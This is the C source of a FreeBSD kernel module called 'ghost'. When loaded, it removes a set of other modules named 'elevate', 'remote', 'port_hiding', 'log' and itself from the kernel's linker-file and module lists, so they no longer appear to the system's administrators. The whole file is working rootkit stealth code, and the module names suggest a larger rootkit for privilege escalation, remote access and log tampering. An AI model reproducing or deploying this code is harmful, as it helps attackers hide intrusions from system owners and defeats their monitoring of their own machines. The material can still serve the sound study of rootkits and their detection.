/*
 * When this KLD is loaded, it will hide all the modules listed in char *klds[].
 * Make sure to load this module last!
 */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/queue.h>
#include <sys/linker.h>
#include <bsm/audit_kevents.h>

#define MAX_STRING_SIZE 256

/* Linker file lists */
extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;

/* Modules list */
typedef TAILQ_HEAD(, module) module_list_t;
extern module_list_t modules;
extern int nextid;
struct module {
    TAILQ_ENTRY(module) link; /* chain together all modules */
    TAILQ_ENTRY(module) flink; /* all modules in a file */
    struct linker_file* file; /* file which contains this module */
    int refs; /* reference count */
    int id; /* unique id number */
    char* name ;/* module name */
    modeventhand_t handler; /* event handler */
    void* arg; /* argument for handler */
    modspecific_t data; /* module specific data */
};

int linkers_index = 0, module_index = 0;
char *klds[] = {"elevate", "remote", "ghost", "port_hiding", "log"};

static int load(struct module *module, int cmd, void *arg) {
    char *module_name;
    char linker_name[MAX_STRING_SIZE];

    struct linker_file *lf;
    struct module *mod;
    for (int i = 0; i < (sizeof(klds) / sizeof(char *)); i++) {
        module_name = klds[i];
        /* Craft linker name (concatenate .ko) */
        snprintf(linker_name, sizeof(linker_name), "%s.ko", module_name);

        sx_xlock(&kld_sx);

    	/* Decrement kernel image's reference count */
    	(&linker_files)->tqh_first->refs--;

    	/* Remove linker_name from linker_files list. */
    	TAILQ_FOREACH(lf, &linker_files, link) {
    		if (lf->filename != NULL && strcmp(lf->filename, linker_name) == 0) {
    		    next_file_id--;

    			TAILQ_REMOVE(&linker_files, lf, link);
    			break;
    		}
    	}

    	sx_xunlock(&kld_sx);

    	sx_xlock(&modules_sx);

    	/* Remove module_name from modules list. */
    	TAILQ_FOREACH(mod, &modules, link) {
    		if (mod->name != NULL && strcmp(mod->name, module_name) == 0) {
    		    nextid--;
    			TAILQ_REMOVE(&modules, mod, link);
    			break;
    		}
    	}

    	sx_xunlock(&modules_sx);
    }
    return(0);
}

static moduledata_t ghost_mod = {
	"ghost", // name
	load, // event handler
	NULL // extras
};

DECLARE_MODULE(ghost, ghost_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
